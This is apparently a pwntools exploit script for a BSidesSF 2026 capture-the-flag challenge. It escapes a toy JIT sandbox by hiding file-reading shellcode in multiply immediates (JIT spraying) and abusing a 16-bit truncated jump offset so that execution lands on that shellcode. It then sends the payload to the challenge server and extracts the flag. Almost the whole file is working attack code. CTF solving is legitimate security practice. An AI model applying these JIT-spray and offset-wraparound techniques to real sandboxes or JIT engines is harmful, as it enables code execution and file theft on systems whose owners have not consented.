#!/usr/bin/env python3
"""
rugdoctor JIT sandbox escape — BSidesSF 2026 PWN (1000 pts)

Bug: if/endif uses 16-bit truncated offsets (movzwl) for je rel32.
When the if body crosses a 65536-byte boundary, the je offset wraps
and can jump backward to shellcode hidden in mul immediates.

Strategy:
  1. Encode shellcode in mul $a immediates using EB 03 JIT spray
  2. Place if $b (with $b=0) right after the muls
  3. Pad the if body to exactly cross a 65536 boundary
  4. endif patches the je with a negative offset → backward jump to shellcode
"""
from pwn import *
import struct, sys

context.arch = 'amd64'

HOST = 'rugdoctor-f61acdb4.challenges.bsidessf.net'
PORT = 9898
LOCAL = '--local' in sys.argv

# Shellcode using EB 03 JIT spray encoding
# Each mul slot: [sc_byte0][sc_byte1][EB][03] (2 useful bytes per slot)
# Between slots: 4d 69 e4 (3 bytes overhead, skipped by EB 03)
shellcode = asm(
    shellcraft.open('/home/ctf/flag.txt') +
    shellcraft.read('rax', 'rsp', 256) +
    shellcraft.write(1, 'rsp', 256) +
    shellcraft.exit(0)
)
log.info(f"Shellcode: {len(shellcode)} bytes")

# Split into 2-byte chunks, pad each with EB 03
chunks = []
for i in range(0, len(shellcode), 2):
    sc = shellcode[i:i+2]
    if len(sc) == 1:
        sc += b'\x90'
    val = struct.unpack('<I', sc + b'\xeb\x03')[0]
    chunks.append(val)

log.info(f"Chunks: {len(chunks)} mul instructions ({len(chunks)*7} JIT bytes)")

# Build rugdoctor code
lines = []
lines.append('let $b 0')      # r13 = 0 (for if condition)
lines.append('let $a 1')      # r12 = 1 (for mul target)

# Shellcode muls starting at JIT offset 15
for val in chunks:
    lines.append(f'mul $a {val}')
# Shellcode entry point: JIT offset 18 (= offset 15 + 3, the immediate of first mul)

# if $b at offset 15 + len(chunks)*7
if_offset = 15 + len(chunks) * 7
saved_offset = if_offset + 5  # position of je's rel32 bytes
log.info(f"if at JIT offset {if_offset}, saved_offset = {saved_offset}")

lines.append('if $b')  # test r13,r13; je rel32 (9 bytes)

# Pad inside the if body to make endif cross a 65536 boundary
# endif_offset (C) = if_offset + 9 + body_bytes
# We need C mod 65536 = 18 (the shellcode entry point)
# body_bytes = 65536 - (if_offset + 9) + 18 (mod 65536)
# Actually: C = if_offset + 9 + body
# C mod 65536 = 18
# body = (18 - if_offset - 9) mod 65536
# If if_offset + 9 > 18: body = 65536 - (if_offset + 9) + 18

C_target_mod = 18  # shellcode JIT offset
body_needed = (C_target_mod - if_offset - 9) % 65536
if body_needed == 0:
    body_needed = 65536  # need at least one full wrap

log.info(f"Body needed: {body_needed} bytes")

# Fill body with `add $a 1` (7 bytes each)
full_adds = body_needed // 7
remainder = body_needed % 7

if remainder == 0:
    for _ in range(full_adds):
        lines.append('add $a 1')
elif remainder == 3:
    # letv $c $a = 3 bytes
    for _ in range(full_adds):
        lines.append('add $a 1')
    lines.append('letv $c $a')
elif remainder == 6:
    # let $c 0 = 6 bytes
    for _ in range(full_adds):
        lines.append('add $a 1')
    lines.append('let $c 0')
else:
    # Adjust: use combinations of add(7), letv(3), let(6) to hit remainder
    # add(7)*n + letv(3)*m + let(6)*k = remainder, with n+m+k minimal
    # Try: remainder can be achieved with at most 2 extra instructions
    found = False
    for n_letv in range(3):
        for n_let in range(3):
            extra = n_letv * 3 + n_let * 6
            if extra == remainder:
                for _ in range(full_adds):
                    lines.append('add $a 1')
                for _ in range(n_letv):
                    lines.append('letv $c $a')
                for _ in range(n_let):
                    lines.append('let $c 0')
                found = True
                break
            elif extra < remainder and (remainder - extra) % 7 == 0:
                for _ in range(full_adds + (remainder - extra) // 7):
                    lines.append('add $a 1')
                for _ in range(n_letv):
                    lines.append('letv $c $a')
                for _ in range(n_let):
                    lines.append('let $c 0')
                found = True
                break
        if found:
            break
    if not found:
        log.error(f"Can't fill remainder {remainder}")
        exit(1)

lines.append('endif')
lines.append('exit 0')

# Verify offsets
C = if_offset + 9 + body_needed
log.info(f"endif at C = {C}, C mod 65536 = {C % 65536}")
assert C % 65536 == C_target_mod, f"C mod 65536 = {C % 65536} != {C_target_mod}"

# Verify je offset
je_offset_val = (C % 65536) - (saved_offset % 65536) - 4
log.info(f"je offset = {je_offset_val} (target = saved+4+offset = {saved_offset+4+je_offset_val})")
assert saved_offset + 4 + je_offset_val == 18, "Target mismatch!"

code = '\n'.join(lines) + '\n'
log.info(f"Code: {len(lines)} lines, {len(code)} bytes")

if LOCAL:
    from subprocess import run
    log.info("Testing locally...")
    r = run(['./rugdoctor'], input=code.encode(), capture_output=True, timeout=30,
            cwd='/home/ubuntu/bsidesSF2026/pwn/rugdoctor')
    log.info(f"Exit: {r.returncode}")
    out = r.stdout.decode(errors='replace')
    import re
    flag = re.search(r'CTF\{[^}]+\}', out)
    if flag:
        log.success(f"FLAG: {flag.group()}")
    elif r.returncode == -5:
        log.info("SIGTRAP (int3) — shellcode reached!")
    elif r.returncode == -11:
        log.info("SIGSEGV — check shellcode")
    else:
        log.info(f"Output: {out[-200:]}")
else:
    io = remote(HOST, PORT)
    io.recvuntil(b'ctrl-d')
    io.recvline()
    log.info("Sending code...")
    io.send(code.encode())
    io.shutdown('send')
    try:
        io.recvuntil(b'--------', timeout=10)
        io.recvline()
    except:
        pass
    import re
    try:
        result = io.recvall(timeout=15)
        out = result.decode(errors='replace')
        log.info(f"Output: {out[:500]}")
        flag = re.search(r'CTF\{[^}]+\}', out)
        if flag:
            log.success(f"FLAG: {flag.group()}")
    except:
        log.warning("Timeout")
    io.close()
